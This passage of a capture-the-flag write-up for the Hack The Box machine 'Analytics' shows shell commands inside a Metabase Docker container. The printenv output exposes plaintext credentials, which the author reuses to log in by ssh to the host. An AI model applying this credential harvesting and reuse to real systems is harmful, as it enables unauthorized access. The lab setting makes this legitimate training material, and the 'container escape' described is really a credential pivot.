After getting my initial shell, I noticed that it was a docker container and I need a way to get out of there so I looked around and found the metabase script.

```
28b3b7e265f7:/$ cd /app
cd /app
28b3b7e265f7:/app$ ls
ls
certs
metabase.jar
run_metabase.sh
28b3b7e265f7:/app$ cat run_metabase.sh
cat run_metabase.sh
#!/bin/bash

...

# Here we define which env vars are the ones that will be supported with a "_FILE" ending. We started with the ones that would contain sensitive data
docker_setup_env() {
    file_env 'MB_DB_USER'
    file_env 'MB_DB_PASS'
    file_env 'MB_DB_CONNECTION_URI'
    file_env 'MB_EMAIL_SMTP_PASSWORD'
    file_env 'MB_EMAIL_SMTP_USERNAME'
    file_env 'MB_LDAP_PASSWORD'
    file_env 'MB_LDAP_BIND_DN'
}


...

28b3b7e265f7:/app$ 
```

### Getting environment variables
After checking out the script, I noticed that it was setting environment variables, so I decided to call all the environment variables and was able to escape the docker container.

```
28b3b7e265f7:/app$ printenv
printenv
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=28b3b7e265f7
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/app
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/bin/printenv
OLDPWD=/
28b3b7e265f7:/app$
```

### ssh
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Analytics]
└─# ssh metalytics@analytical.htb
metalytics@analytical.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 10 07:54:23 PM UTC 2023

  System load:              0.025390625
  Usage of /:               95.9% of 7.78GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                158
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.149.35
  IPv6 address for eth0:    dead:beef::250:56ff:feb0:b4ed

  => / is using 95.9% of 7.78GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 10 19:32:27 2023 from 10.10.16.4
```